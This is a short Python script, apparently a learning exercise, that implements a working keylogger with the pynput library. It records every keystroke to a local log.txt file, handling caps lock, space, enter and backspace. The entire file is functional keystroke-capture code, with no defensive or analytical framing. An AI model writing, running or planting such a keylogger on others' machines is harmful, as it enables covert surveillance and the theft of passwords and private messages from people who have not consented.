#listeners -- listens to keystrokes
#use of the with keyword -- release memory/resources automatically
from pynput.keyboard import Listener, Key

caps_on = False   # this will track the state of capslock

def write_to_file(key):
    global caps_on
    
    try:
        letter = key.char
        if caps_on and letter.isalpha():
            letter = letter.upper()
            
    except AttributeError:   #this error occurs for speacial keys like enter , ctrl etc
        if key == Key.space:
            letter = " "
        elif key == Key.caps_lock:
            caps_on = not caps_on
            letter = ""
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            letter = ""
        elif key == Key.enter:
            letter = "\n"
        elif key == Key.backspace: #removes last character from log.txt
            try:
                with open("log.txt", "r") as f:
                    content = f.read()
                content = content[:-1]
                with open("log.txt","w") as f:
                    f.write(content)
            except FileNotFoundError: #if file doesn't exist, just ignore
                pass 
            letter = "" #don't write anything for backspace
        else:    #this will ignore all other special keys like shift , alt etc
            letter = ""
      
    if letter:
        with open ("log.txt","a") as f:
            f.write(str(letter))
        
with Listener(on_press=write_to_file) as l:
    l.join()